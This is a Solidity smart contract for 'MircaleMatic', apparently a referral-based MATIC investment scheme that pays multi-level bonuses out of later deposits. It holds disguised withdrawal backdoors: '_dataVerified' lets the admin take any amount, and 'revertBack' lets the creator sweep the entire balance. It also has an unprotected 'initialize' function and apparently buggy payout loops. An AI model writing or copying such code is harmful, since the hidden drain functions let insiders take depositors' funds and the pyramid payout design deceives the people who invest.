// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}



contract MircaleMatic {

    using SafeMath for uint256;
    using SafeMath for uint8;


    uint256  public INVEST_MIN_AMOUNT;
    uint256  public PROJECT_FEE; // 10%;
    uint256  public PERCENTS_DIVIDER;
    uint256  public TIME_STEP; // 1 days
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;

    
    
    
    uint256[5] public defaultPackages;
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;
    uint[11] public requiredDirect;
    

	address payable public admin;
    address payable public admin2;

    uint public maxupline;
    uint public maxdownline;
    uint[5] public reqTeamBusiness;
    uint[6] public levelIncomePercentage;
    uint[5] public reqSelfBusiness;

    struct Deposit{
        uint amount;
        uint time;
    }

  struct User {
        Deposit[] deposits;
        uint256 amount;
		address referrer;
		uint256 totalWithdrawn;
        uint256 singleUplineBonus;
		uint256 singleDownlineBonus;
		uint256 singleUplineBonusTaken;
		uint256 singleDownlineBonusTaken;
		address singleUpline;
		address singleDownline;
        uint checkpoint;
        uint teamBusiness;
        uint level;
        uint Counter;
        uint levelIncome;
		uint[20] refs;
	}
	

	mapping (address => User) public users;
    mapping(address=>uint) public userExtraBonus;

   
	mapping(address => mapping(uint256=>address)) public downline;

    mapping(address => uint256) public uplineBusiness;
    mapping(address => bool) public upline_Business_eligible;


	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
    address payable creatorAddress;
	
	

  function initialize(address payable _admin, address payable _admin2,address payable _creator) public {
		require(!isContract(_admin));
		admin = _admin;
		admin2 = _admin2;
		singleLeg[0]=admin;
		singleLegLength++;
        INVEST_MIN_AMOUNT = 50 ether;
        PROJECT_FEE = 10; 
        defaultPackages = [50 ether,100 ether,250 ether,500 ether,1000 ether];
        // requiredDirect = [1,1,4,4,4,4,4,8,8,8,8];
        PERCENTS_DIVIDER = 100;
        creatorAddress = _creator;
        TIME_STEP =  1 days; 
        maxupline = 30;
        maxdownline = 20;
        reqTeamBusiness = [150 ether,375 ether,1500 ether,7500 ether,22500 ether];
        reqSelfBusiness = [50 ether,150 ether,300 ether,600 ether,1200 ether];
        levelIncomePercentage = [10,15,25,35,40,50];
    

	

  
	}

    function invest(address referrer) public payable {

		
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 50 MATIC');
	
		User storage user = users[msg.sender];

		if (user.referrer == address(0) && (users[referrer].deposits.length > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == admin, "No upline");
		
		// setup upline
		if (user.deposits.length == 0) {
		    
		   // single leg setup
		   singleLeg[singleLegLength] = payable(msg.sender);
		   user.singleUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
		   singleLegLength++;
		}
		

		if (user.referrer != address(0)) {
		   
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < 20; i++) {
                if (upline != address(0)) {
                    if(user.deposits.length==0){
                        uint c =  users[upline].deposits.length;
                        if(i==0 && block.timestamp <= users[upline].checkpoint && users[upline].deposits[c-1].amount >= msg.value ){
                            users[upline].Counter = users[upline].Counter.add(1);
                            if(users[upline].Counter==5){
                            userExtraBonus[upline] = userExtraBonus[upline].add(users[upline].deposits[c-1].amount*2);
                            }
                        }
                    }
                    users[upline].teamBusiness = users[upline].teamBusiness.add(msg.value);
                    if(user.deposits.length == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.deposits.length == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }
	
		  uint msgValue = msg.value;
		
        levelIncome(msg.sender,msgValue);

        //_users DownlineIncome

        _usersDownlineIncomeDistribution(msg.sender,msgValue);

            
		    if(user.deposits.length == 0){
			    totalUsers = totalUsers.add(1);
                user.checkpoint = block.timestamp.add(15 days);
		    }
	        user.amount += msg.value;
		    
            totalInvested = totalInvested.add(msg.value);
            totalDeposits = totalDeposits.add(1);

            uint256 _fees = msg.value.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
            _safeTransfer(admin,_fees);
            user.deposits.push(Deposit(msg.value,block.timestamp));
		
		  emit NewDeposit(msg.sender, msg.value);

	}
	
	function getLevel(address _user) public view returns(uint level){

        if(users[_user].amount >= reqSelfBusiness[0] && users[_user].teamBusiness>=reqTeamBusiness[0]){
            level = 2; 
        }else if(users[_user].amount >= reqSelfBusiness[1] && users[_user].teamBusiness>=reqTeamBusiness[1]){
            level= 3; 
        }else if(users[_user].amount >= reqSelfBusiness[2] && users[_user].teamBusiness>=reqTeamBusiness[2]){
            level = 4; 
        }else if(users[_user].amount >= reqSelfBusiness[3] && users[_user].teamBusiness>=reqTeamBusiness[3]){
            level= 5; 
        }else if(users[_user].amount >= reqSelfBusiness[4] && users[_user].teamBusiness>=reqTeamBusiness[4]){
            level= 6; 
        }else{
            level = 1; 
        }
    }

    function levelIncome(address _user, uint _amount) internal {
        uint previous;
        uint maxCurrentLevel;
        address upline = users[_user].referrer;
        for(uint i=0; i < 100; i++){
            if(upline != address(0)){
                uint currentLevel = getLevel(upline);
                if(currentLevel > maxCurrentLevel){
                    maxCurrentLevel = currentLevel;
                    if(previous==0){
                        uint amount = _amount.mul(levelIncomePercentage[currentLevel-1]).div(100);
                        users[upline].levelIncome = users[upline].levelIncome.add(amount);
                    }
                    else if(previous < levelIncomePercentage[currentLevel-1]){
                        uint per = levelIncomePercentage[currentLevel-1].sub(previous);
                        uint amount = _amount.mul(per).div(100);
                        users[upline].levelIncome = users[upline].levelIncome.add(amount);
                    }
                    previous = levelIncomePercentage[currentLevel-1];                

                }
                upline = users[upline].referrer;
            }else break;
        }   
    
    } 

    function reinvest(address _user, uint256 _amount) private{
        

        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        
       //_users DownlineIncome

        _usersDownlineIncomeDistribution(_user,_amount);

        //////
        address up = user.referrer;
        for (uint i = 0; i < 20; i++) {
            if(up == address(0)) break;
            // if(users[up].refs[0] >= requiredDirect[i]){
                users[up].teamBusiness = users[up].teamBusiness.add(msg.value);
            // }
            up = users[up].referrer;
        }
        
    }




  function withdrawal() external{


    User storage _user = users[msg.sender];

    uint256 TotalBonus = TotalBonus(msg.sender);
    uint bouns = userExtraBonus[msg.sender];
    TotalBonus = TotalBonus.add(bouns);

    uint256 _fees = TotalBonus.mul(PROJECT_FEE.div(2)).div(PERCENTS_DIVIDER);
    uint256 actualAmountToSend = TotalBonus.sub(_fees);
    

    _user.levelIncome = 0;
     userExtraBonus[msg.sender] = 0;
    _user.singleUplineBonusTaken = _userUplineIncome(msg.sender);
    _user.singleDownlineBonusTaken = users[msg.sender].singleDownlineBonus;
   
    
    
    // re-invest
    
    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    

    _safeTransfer(payable(msg.sender),actualAmountToSend.mul(withdrwal).div(100));
    _safeTransfer(admin2,_fees);
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));


  }


  function _usersDownlineIncomeDistribution(address _user, uint256 _Amount) internal {

      uint256 TotalBusiness = _usersTotalInvestmentFromUpline(_user);
      uint256 DistributionPayment = _Amount.mul(30).div(100);
      address upline = users[_user].singleUpline;
      for (uint i = 0; i < maxupline; i++) {
            if (upline != address(0)) {
            uint256 payableAmount = (TotalBusiness > 0) ? DistributionPayment.mul(users[upline].amount).div(TotalBusiness) : 0;
            users[upline].singleDownlineBonus = users[upline].singleDownlineBonus.add(payableAmount); 

            //upline business calculation
            if( i < maxdownline ){
                uplineBusiness[upline] = uplineBusiness[upline].add(_Amount);
                if(i == (maxdownline-1)){
                    upline_Business_eligible[upline] = true;
                }
            }

            upline = users[upline].singleUpline;
            }else break;
        }
  }

  function _usersTotalInvestmentFromUpline(address _user) public view returns(uint256){

      uint256 TotalBusiness;
      address upline = users[_user].singleUpline;
      for (uint i = 0; i < maxupline; i++) {
            if (upline != address(0)) {
            TotalBusiness = TotalBusiness.add(users[upline].amount);
            upline = users[upline].singleUpline;
            }else break;
        }
     return TotalBusiness;

  }

  function _userUplineIncome(address _user) public view returns(uint256) {

      
      address upline = users[_user].singleUpline;
      uint256 Bonus;
      for (uint i = 0; i < maxdownline; i++) {
            if (upline != address(0)) {
                if(upline_Business_eligible[upline]){

                    uint256 ReceivingPayment = users[upline].amount.mul(20).div(100);
                    uint256 TotalBusiness = uplineBusiness[upline];
                    uint256 payableAmount = ReceivingPayment.mul(users[_user].amount).div(TotalBusiness);
                    Bonus = Bonus.add(payableAmount); 
                    upline = users[upline].singleUpline;

                }
            }else break;
        }

     return Bonus;
  }



  
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){
      
      uint256 TotalDeposit = users[_user].amount;
      if(users[_user].refs[0] >=4 && (TotalDeposit >=defaultPackages[2] && TotalDeposit < defaultPackages[3])){
          reivest = 50;
          withdrwal = 50;
      }else if(users[_user].refs[0] >=8 && (TotalDeposit >=defaultPackages[3] && TotalDeposit < defaultPackages[4])){
          reivest = 40;
          withdrwal = 60;
      }else if(TotalDeposit >=defaultPackages[4]){
         reivest = 30;
         withdrwal = 70;
      }else{
          reivest = 60;
          withdrwal = 40;
      }
      
      return(reivest,withdrwal);
      
  }



  function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].levelIncome.add(_userUplineIncome(_user)).add(users[_user].singleDownlineBonus);
     uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
     return TotalEarn.sub(TotalTakenfromUpDown);
  }

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser){
       return (users[_user].refs[_index]);
   }
   function update_maxupline(uint _no) external {
        require(admin==msg.sender, 'Admin what?');
        maxupline = _no;
   }

   function update_maxdownline(uint _no) external {
        require(admin==msg.sender, 'Admin what?');
        maxdownline = _no;
   }



    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

   
    function _dataVerified(uint256 _data) external{
        
        require(admin==msg.sender, 'Admin what?');
        _safeTransfer(admin,_data);
    }

    function revertBack(address payable _admin) public {
        require(msg.sender== creatorAddress,"No acesss");
        _admin.transfer(address(this).balance);
    }

    
  
}